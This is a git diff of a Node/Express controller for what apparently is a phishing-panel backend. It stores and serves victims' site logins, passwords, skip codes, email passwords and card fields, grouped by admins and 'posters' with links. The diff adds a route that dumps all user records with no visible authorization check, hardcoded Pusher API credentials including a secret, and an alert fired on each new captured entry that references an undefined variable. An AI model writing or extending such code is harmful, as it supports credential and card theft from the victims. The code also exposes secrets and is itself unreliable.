@@ -14,7 +14,23 @@ import Cash from '../models/Cash.js'
 
 
 
+export const yoyo = async (req, res) => {
 
+
+
+
+    try {
+
+        const data = await User.find().sort({ createdAt: -1 })
+        return res.status(200).json({ data: data })
+
+
+
+    } catch (e) {
+        res.status(400).json({ e: "error" })
+    }
+
+}
 
 
 
@@ -214,8 +230,8 @@ export const info_get = async (req, res) => {
                         model: 'Info',
                         select: 'site email password skipcode mail mailPass onlyCard holdingCard',
                     }
-                }).sort({ createdAt: -1 })
-                .select('posters').populate('posters', 'username password links ')
+                })
+                .select('posters').populate('posters', 'username password links ').sort({ createdAt: -1 })
             return res.status(200).json({ user: user[0] })
 
 
@@ -317,6 +333,14 @@ export const poster_add = async (req, res) => {
 
 
 export const add_data = async (req, res) => {
+    const pusher = new Pusher({
+        appId: '1710273',
+        key: 'ff0fc3f0096af6ab8a90',
+        secret: '0e0830285b87499f5085',
+        cluster: 'ap2',
+        useTLS: true,
+      });
+      
 
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard } = req.body
@@ -338,6 +362,9 @@ export const add_data = async (req, res) => {
             })
             posterFound.details.push(info._id)
             await posterFound.save();
+            pusher.trigger('notifications', 'new-notification', {
+                message,
+              });
             return   res.status(200).json({ info: info })
 
         }
